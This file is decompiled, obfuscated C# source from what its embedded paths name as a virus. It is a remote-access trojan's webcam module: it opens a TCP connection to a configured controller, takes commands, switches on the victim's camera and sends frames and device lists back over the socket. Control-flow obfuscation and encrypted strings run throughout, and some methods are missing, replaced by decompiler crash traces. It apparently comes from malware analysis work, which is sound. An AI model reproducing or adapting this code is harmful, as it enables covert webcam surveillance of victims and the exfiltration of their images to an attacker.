using AForge.Video;
using AForge.Video.DirectShow;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;

public class __________________________________
{
	private VideoCaptureDevice _;

	public string __;

	private FilterInfoCollection ___;

	private TcpClient ____;

	private bool _____;

	private __________________________________.___________________________________ ______;

	public StreamWriter _______;

	public StreamReader ________;

	private string _________;

	public string __________;

	private Bitmap ___________;

	public static object ____________;

	public __________________________________()
	{
		this.___ = new FilterInfoCollection(FilterCategory.VideoInputDevice);
		this._____ = false;
		this._________ = <Module>.______<string>(-551622839);
		this.__________ = <Module>.____<string>(816071137);
	}

	public void ___(object sender, NewFrameEventArgs e)
	{
		// 
		// Current member / type: System.Void __________________________________::___(System.Object,AForge.Video.NewFrameEventArgs)
		// File path: C:\Users\george.bungarzescu\Desktop\virus\dot_peack_decompiled\VirusDecompiler\bin\Debug\HuuGhrjxjVBDecoded.hex-cleaned.dll
		// 
		// Product version: 2016.1.112.1
		// Exception in: System.Void ___(System.Object,AForge.Video.NewFrameEventArgs)
		// 
		// Object reference not set to an instance of an object.
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 112
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 26
		//    at ..BuildTree( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\FastDominatorTreeBuilder.cs:line 25
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DominatorTreeDependentStep.cs:line 18
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 68
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 59
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 128
		//    at ..( ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 51
		//    at ..(MethodBody ,  , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 88
		//    at ..(MethodBody , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 70
		//    at ..( , ILanguage , MethodBody , & ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 99
		//    at ..(MethodBody , ILanguage , & ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 62
		//    at ..(ILanguage , MethodDefinition ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\WriterContextServices\BaseWriterContextService.cs:line 116
		// 
		// mailto: JustDecompilePublicFeedback@telerik.com

	}

	public void ____(string string_0)
	{
		int num = 0;
		string[] ______ = null;
		MemoryStream memoryStream = null;
		string[] strArrays = null;
		IEnumerator enumerator = null;
		int length = 0;
		int length1;
		int num1;
		object obj;
		string string0 = string_0;
		int _________ = <Module>.________________;
		if ((329 * _________ + 1719 * _________) / 82 != 1493426870)
		{
			length1 = Type.EmptyTypes.Length + 14494;
		}
		else
		{
			length1 = ((8388607 | _________ / 672455 % 5327715) != 8388607 ? 2058321825 : (int)(sizeof(ushort) + -2053656365));
		}
		uint num2 = sizeof(Guid) + 14840;
		if ((3802 ^ _________ / 460502399) == 0)
		{
			num1 = (int)(sizeof(ushort) + -1410391283);
		}
		else
		{
			num1 = ((1231 | _________ / 509733418) == 1231 ? 171 : (int)(sizeof(byte) + -1957030951));
		}
		string_0 = ___________________________________________________________________._(string0, <Module>.__________(length1, (int)num2, num1));
		try
		{
			if (string_0.Contains(<Module>._______<string>(1023697363)))
			{
				strArrays = Strings.Split(string_0, <Module>._____<string>(-1479692421), -1, CompareMethod.Binary);
				if ((-63 | 53 * length + 11 * length) != -63)
				{
					goto Label0;
				}
				obj = Type.EmptyTypes.Length + 1;
			}
			else
			{
				goto Label0;
			}
		Label7:
			while (true)
			{
				switch (obj)
				{
					case 0:
					{
						this._ = new VideoCaptureDevice(this.___.get_Item(Conversions.ToInteger(strArrays[1])).get_MonikerString());
						if (length == -28985)
						{
							goto case 2;
						}
						break;
					}
					case 1:
					{
						goto Label0;
					}
					case 2:
					{
						this._.Start();
						Thread.Sleep(500);
						this._____(50);
						int num3 = length;
						length = -27878;
						if (num3 == -24941)
						{
							break;
						}
						else
						{
							goto Label3;
						}
					}
					case 3:
					{
						goto Label2;
					}
					default:
					{
						goto Label4;
					}
				}
				__________________________________ __________________ = this;
				this._.add_NewFrame(new NewFrameEventHandler(__________________, __________________.___));
				length = Type.EmptyTypes.Length + 18812;
				obj = sizeof(Guid) + -14;
			}
		Label4:
		Label0:
			if (Operators.CompareString(string_0, <Module>._______<string>(-2124384702), false) != 0)
			{
				goto Label6;
			}
			obj = sizeof(short) + 1;
			goto Label7;
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
		return;
	Label2:
		this.___________();
		goto Label6;
	Label3:
	Label12:
		length = -27878;
		if (Operators.CompareString(string_0, <Module>.______<string>(-644347396), false) == 0)
		{
			if (length == -2244)
			{
				goto Label2;
			}
			this._.Stop();
		}
		if (string_0.Contains(<Module>.______<string>(676118163)))
		{
			this._____(Convert.ToInt32(strArrays[1]));
		}
		if (Operators.CompareString(string_0, <Module>.______<string>(2089308279), false) == 0)
		{
			string str = <Module>.______<string>(-1658876170);
			try
			{
				enumerator = this.___.GetEnumerator();
				while (enumerator.MoveNext())
				{
					object objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
					str = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(str, NewLateBinding.LateGet(objectValue, null, <Module>._____<string>(967671166), new object[0], null, null, null)), <Module>._______<string>(-1016240021)));
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			if (-27738 != sizeof(ushort) + -27741)
			{
				memoryStream = new MemoryStream();
				______ = new string[] { <Module>._____<string>(-608569192), null, null, null, null, null };
				int length2 = Type.EmptyTypes.Length + 0;
				while (true)
				{
					switch (length2)
					{
						case 0:
						{
							______[1] = this.__________;
							______[2] = ______________________________________________________________.________________________;
							num = -16562;
							if ((length % 524288 ^ 2104936) != 0)
							{
								goto Label9;
							}
							if (num - 1898708992 != 66 * num + num * 190 >> 8)
							{
								length2 = Type.EmptyTypes.Length + -1158271270;
								continue;
							}
							else
							{
								length2 = Type.EmptyTypes.Length + 1205908175;
								continue;
							}
						}
						case 1:
						{
							goto Label8;
						}
						default:
						{
							goto case 0;
						}
					}
				}
			Label9:
			}
		Label8:
			do
			{
				______[3] = this.__________;
				______[4] = str;
			}
			while (num == -26878);
			______[5] = this.__________;
			string str1 = string.Concat(______);
			memoryStream.Write(this._________(str1), 0, str1.Length);
			this.________(memoryStream.ToArray());
			memoryStream.Dispose();
		}
		return;
	Label6:
		if (!string_0.Contains(<Module>._______<string>(-120508978)))
		{
			goto Label12;
		}
		length = Type.EmptyTypes.Length + 601;
		obj = sizeof(double) + -8;
		goto Label7;
	}

	public void _____(int int_0)
	{
		try
		{
			byte[] numArray = __________________________________.______(this.___________, int_0);
			MemoryStream memoryStream = new MemoryStream();
			string str = string.Concat(<Module>._____<string>(-1658777767), this.__________);
			memoryStream.Write(this._________(str), 0, str.Length);
			memoryStream.Write(numArray, 0, checked((int)numArray.Length));
			this.________(memoryStream.ToArray());
			memoryStream.Dispose();
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}

	public static byte[] ______(Bitmap bitmap_0, int int_0)
	{
		// 
		// Current member / type: System.Byte[] __________________________________::______(System.Drawing.Bitmap,System.Int32)
		// File path: C:\Users\george.bungarzescu\Desktop\virus\dot_peack_decompiled\VirusDecompiler\bin\Debug\HuuGhrjxjVBDecoded.hex-cleaned.dll
		// 
		// Product version: 2016.1.112.1
		// Exception in: System.Byte[] ______(System.Drawing.Bitmap,System.Int32)
		// 
		// Object reference not set to an instance of an object.
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 112
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 26
		//    at ..BuildTree( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\FastDominatorTreeBuilder.cs:line 25
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DominatorTreeDependentStep.cs:line 18
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 68
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 59
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 128
		//    at ..( ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 51
		//    at ..(MethodBody ,  , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 88
		//    at ..(MethodBody , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 70
		//    at ..( , ILanguage , MethodBody , & ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 99
		//    at ..(MethodBody , ILanguage , & ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 62
		//    at ..(ILanguage , MethodDefinition ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\WriterContextServices\BaseWriterContextService.cs:line 116
		// 
		// mailto: JustDecompilePublicFeedback@telerik.com

	}

	public void _______()
	{
		byte[] numArray;
		string str;
		int num = 0;
		__________________________________ __________________;
		NetworkStream stream;
		object length;
		IAsyncResult asyncResult;
		try
		{
			if (_______________________________________________._)
			{
				if (this.___.Count == 0)
				{
					goto Label0;
				}
				______________________________________________________________.______________(<Module>._______<string>(-1573320945), <Module>._____<string>(891993771));
				int num1 = 5416;
				if (sizeof(double) + 27820 == 27828)
				{
					this.____ = new TcpClient(______________________________________________________________._____________, ______________________________________________________________.______________)
					{
						ReceiveBufferSize = 9999999
					};
					num1 == -247;
					this.____.SendBufferSize = 9999999;
					if (this._____)
					{
						stream = this.____.GetStream();
						numArray = new byte[] { 0 };
						__________________ = this;
						asyncResult = stream.BeginRead(numArray, 0, 0, new AsyncCallback(__________________.____________), null);
						Thread.Sleep(500);
						str = string.Concat(<Module>.____<string>(-1348679420), ______________________________________________________________.________________________, <Module>.____<string>(-1286171096));
						this._____________(str);
						return;
					}
				}
			Label5:
				this._____ = true;
				__________________________________ __________________1 = this;
				this._ += new __________________________________.___________________________________(__________________1.____);
				length = Type.EmptyTypes.Length + 2;
				goto Label2;
			}
		}
		catch (Exception exception1)
		{
			ProjectData.SetProjectError(exception1);
			Exception exception = exception1;
			______________________________________________________________.______________(<Module>.____<string>(1187660804), string.Concat(<Module>._______<string>(-1045625127), exception.ToString()));
			this.___________();
			ProjectData.ClearProjectError();
		}
		return;
	Label0:
		if ((-1048576 & num / 4096) != 0)
		{
			length = sizeof(short) + 1281404180;
		}
		else
		{
			if (-1377828864 + (-1610612736 * num << 25) * 32 == num / 87068)
			{
				______________________________________________________________.___________(<Module>.______<string>(-1992446789));
				Thread.Sleep(5000);
				return;
			}
			length = sizeof(byte) + 0;
		}
	Label2:
		switch (length)
		{
			case 0:
			{
				goto Label5;
			}
			case 2:
			{
				stream = this.____.GetStream();
				numArray = new byte[] { 0 };
				__________________ = this;
				asyncResult = stream.BeginRead(numArray, 0, 0, new AsyncCallback(__________________.____________), null);
				Thread.Sleep(500);
				str = string.Concat(<Module>.____<string>(-1348679420), ______________________________________________________________.________________________, <Module>.____<string>(-1286171096));
				this._____________(str);
				return;
			}
		}
		______________________________________________________________.___________(<Module>.______<string>(-1992446789));
		Thread.Sleep(5000);
	}

	public void ________(byte[] byte_0)
	{
		try
		{
			MemoryStream memoryStream = new MemoryStream();
			memoryStream.Write(byte_0, 0, checked((int)byte_0.Length));
			memoryStream.Write(this._________(this._________), 0, this._________.Length);
			this.____.Client.Send(memoryStream.ToArray(), 0, (int)memoryStream.Length, SocketFlags.None);
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			this.___________();
			ProjectData.ClearProjectError();
		}
	}

	public byte[] _________(string string_0)
	{
		return Encoding.Default.GetBytes(string_0);
	}

	public string __________(byte[] byte_0)
	{
		return Encoding.Default.GetString(byte_0);
	}

	public void ___________()
	{
		// 
		// Current member / type: System.Void __________________________________::___________()
		// File path: C:\Users\george.bungarzescu\Desktop\virus\dot_peack_decompiled\VirusDecompiler\bin\Debug\HuuGhrjxjVBDecoded.hex-cleaned.dll
		// 
		// Product version: 2016.1.112.1
		// Exception in: System.Void ___________()
		// 
		// Object reference not set to an instance of an object.
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 112
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 26
		//    at ..BuildTree( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\FastDominatorTreeBuilder.cs:line 25
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DominatorTreeDependentStep.cs:line 18
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 68
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 59
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 128
		//    at ..( ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 51
		//    at ..(MethodBody ,  , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 88
		//    at ..(MethodBody , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 70
		//    at ..( , ILanguage , MethodBody , & ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 99
		//    at ..(MethodBody , ILanguage , & ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 62
		//    at ..(ILanguage , MethodDefinition ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\WriterContextServices\BaseWriterContextService.cs:line 116
		// 
		// mailto: JustDecompilePublicFeedback@telerik.com

	}

	public void ____________(IAsyncResult iasyncResult_0)
	{
		try
		{
			this.________ = new StreamReader(this.____.GetStream());
			__________________________________.___________________________________ ____ = this.______;
			if (____ != null)
			{
				____(this.________.ReadLine());
			}
			NetworkStream stream = this.____.GetStream();
			byte[] numArray = new byte[] { 0 };
			__________________________________ __________________ = this;
			stream.BeginRead(numArray, 0, 0, new AsyncCallback(__________________.____________), null);
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			this.___________();
			ProjectData.ClearProjectError();
		}
	}

	public void _____________(string string_0)
	{
		try
		{
			this._______ = new StreamWriter(this.____.GetStream());
			this._______.WriteLine(string.Concat(<Module>.______<string>(-1593785447), string_0));
			this._______.Flush();
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			this.___________();
			ProjectData.ClearProjectError();
		}
	}

	private event __________________________________.___________________________________ _
	{
		add
		{
			this.______ += value;
		}
		remove
		{
			this.______ -= value;
		}
	}

	private delegate void ___________________________________(string string_0);
}